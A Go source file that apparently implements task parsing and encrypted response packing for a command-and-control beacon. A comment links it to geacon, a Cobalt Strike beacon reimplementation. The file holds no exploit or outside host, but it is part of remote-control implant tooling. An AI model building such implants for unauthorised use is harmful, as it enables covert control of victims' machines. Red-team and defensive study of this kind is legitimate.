package metadata

import (
	"belin/encrypt"
	"bytes"
	"encoding/binary"
)

var Counter int = 0

/*
	ParseTask extract data from package
*/
func ParseTask(buf *bytes.Buffer, packLen *uint32) (uint32, []byte, error) {
	// The fist 4 bytes is the task number
	cmdTypeB := make([]byte, 4)
	_, err := buf.Read(cmdTypeB)
	if err != nil {
		return 0, nil, err
	}
	cmdType := binary.BigEndian.Uint32(cmdTypeB)

	// After that comes task length
	cmdLenB := make([]byte, 4)
	_, err = buf.Read(cmdLenB)
	if err != nil {
		return 0, nil, err
	}
	cmdLen := binary.BigEndian.Uint32(cmdLenB)

	// Ans the command
	cmdBuf := make([]byte, cmdLen)
	_, err = buf.Read(cmdBuf)
	if err != nil {
		return 0, nil, err
	}

	// The new pack len in the pack - ((int size) x 2 + cmdLen)
	*packLen = *packLen - (4 + 4 + cmdLen)

	return cmdType, cmdBuf, err
}


func PackResp(enc *encrypt.Enc, packType int, data []byte) ([]byte, error) {
	Counter += 1
	
	counterB := make([]byte, 4)
	binary.BigEndian.PutUint32(counterB, uint32(Counter))

	resultLenB := make([]byte, 4)
	resultLen := len(data) + 4
	binary.BigEndian.PutUint32(resultLenB, uint32(resultLen))

	replyTypeB := make([]byte, 4)
	binary.BigEndian.PutUint32(replyTypeB, uint32(packType))

	rawPack := [][]byte {
		counterB,
		resultLenB,
		replyTypeB,
		data,
	}
	pack := bytes.Join(rawPack, []byte(""))

	encPack, err := enc.AesCBCEncrypt(pack, enc.AesKey)
	if err != nil {return nil, err}


	/* 
		cut the zero because Golang's AES encrypt func will padding IV
		(block size in this situation is 16 bytes) before the cipher
		https://github.com/darkr4y/geacon/blob/master/cmd/packet/packet.go
	*/
	encPack = encPack[16:]

	finalLen := len(encPack) + 16
	finalLenB := make([]byte, 4)
	binary.BigEndian.PutUint32(finalLenB, uint32(finalLen))

	hmacHash := enc.HmacHash(encPack)
	resp := [][]byte {
		finalLenB,
		encPack,
		hmacHash,
	}

	return bytes.Join(resp, []byte("")), nil
}